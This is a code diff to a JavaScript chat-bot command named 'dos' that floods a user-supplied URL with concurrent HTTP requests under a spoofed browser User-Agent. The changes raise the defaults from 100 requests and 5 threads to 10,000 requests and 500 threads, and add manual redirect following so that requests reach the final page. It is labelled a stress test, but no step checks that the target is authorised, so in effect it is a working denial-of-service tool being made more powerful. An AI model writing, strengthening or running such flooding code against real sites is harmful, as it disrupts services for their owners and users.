@@ -25,7 +25,7 @@ const createSession = () => {
     
     const session = axios.create({
         timeout: 30000,
-        maxRedirects: 10,  // Allow up to 10 redirects (Python default is 30)
+        maxRedirects: 0,  // Don't auto-follow redirects - we'll handle manually
         validateStatus: () => true,
         headers: {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -65,6 +65,39 @@ const createSession = () => {
     
     return session;
 };
+
+// Follow redirects manually (like Python's requests)
+async function followRedirects(session, url, maxRedirects = 10) {
+    let currentUrl = url;
+    let redirectCount = 0;
+    
+    while (redirectCount < maxRedirects) {
+        const response = await session.get(currentUrl);
+        
+        // Check if it's a redirect (3xx status code)
+        if (response.status >= 300 && response.status < 400) {
+            const redirectLocation = response.headers.location;
+            if (!redirectLocation) {
+                return response;
+            }
+            
+            // Handle relative redirects
+            if (redirectLocation.startsWith('/')) {
+                const urlObj = new URL(currentUrl);
+                currentUrl = `${urlObj.protocol}//${urlObj.host}${redirectLocation}`;
+            } else {
+                currentUrl = redirectLocation;
+            }
+            
+            redirectCount++;
+            continue;
+        }
+        
+        return response;
+    }
+    
+    return null;
+}
 
 module.exports = {
     name: 'dos',
@@ -106,8 +139,8 @@ module.exports = {
         }
         
         let url = args[0];
-        let totalRequests = 100;
-        let threads = 5;
+        let totalRequests = 10000;
+        let threads = 500;
         
         // Parse parameters
         if (args[1] && !isNaN(parseInt(args[1]))) {
@@ -265,65 +298,36 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
             }
             
             try {
-                // Don't follow redirects automatically - let's see where it's redirecting to
-                const response = await threadSession.get(targetUrl, {
-                    maxRedirects: 0,  // Don't auto-follow redirects
-                    validateStatus: () => true
-                });
+                // Follow redirects manually (like Python's requests)
+                const finalResponse = await followRedirects(threadSession, targetUrl);
                 
-                // Check if it's a redirect
-                if (response.status >= 300 && response.status < 400) {
-                    const redirectLocation = response.headers.location;
-                    console.log(`[DOS] Redirect detected: ${response.status} -> ${redirectLocation}`);
-                    
-                    // Follow the redirect manually (like Python's requests)
-                    if (redirectLocation) {
-                        const redirectResponse = await threadSession.get(redirectLocation);
-                        if (redirectResponse.status === 200) {
-                            successCount++;
-                        } else {
-                            failureCount++;
-                            errorTypes.set(`Redirect ${response.status} -> ${redirectResponse.status}`, 
-                                (errorTypes.get(`Redirect ${response.status} -> ${redirectResponse.status}`) || 0) + 1);
-                        }
-                    } else {
-                        failureCount++;
-                        errorTypes.set(`Redirect ${response.status} (no location)`, 
-                            (errorTypes.get(`Redirect ${response.status} (no location)`) || 0) + 1);
-                    }
-                } else if (response.status === 200) {
+                if (finalResponse && finalResponse.status === 200) {
                     successCount++;
                 } else {
                     failureCount++;
-                    errorTypes.set(`HTTP ${response.status}`, (errorTypes.get(`HTTP ${response.status}`) || 0) + 1);
+                    const status = finalResponse?.status || 'unknown';
+                    errorTypes.set(`HTTP ${status}`, (errorTypes.get(`HTTP ${status}`) || 0) + 1);
                     
                     // Log first few errors
                     if (failureCount <= 5) {
-                        console.log(`[DOS] Error #${failureCount}: HTTP ${response.status} - ${response.statusText}`);
-                        if (response.data && response.data.length < 500) {
-                            console.log(`[DOS] Response data:`, response.data);
-                        }
+                        console.log(`[DOS] Error #${failureCount}: HTTP ${status}`);
                     }
                 }
             } catch (error) {
                 failureCount++;
-                
                 let errorType = error.code || error.message;
                 errorTypes.set(errorType, (errorTypes.get(errorType) || 0) + 1);
                 
                 // Log first few errors for debugging
                 if (failureCount <= 5) {
-                    console.log(`[DOS] Error #${failureCount}:`, {
-                        message: error.message,
-                        code: error.code
-                    });
+                    console.log(`[DOS] Error #${failureCount}:`, error.message);
                 }
             }
             
             completedRequests++;
             
             // Update progress
-            if (completedRequests % 10 === 0 || completedRequests === totalRequests) {
+            if (completedRequests % 100 === 0 || completedRequests === totalRequests) {
                 const percent = ((completedRequests / totalRequests) * 100).toFixed(1);
                 
                 // Create error summary for progress update
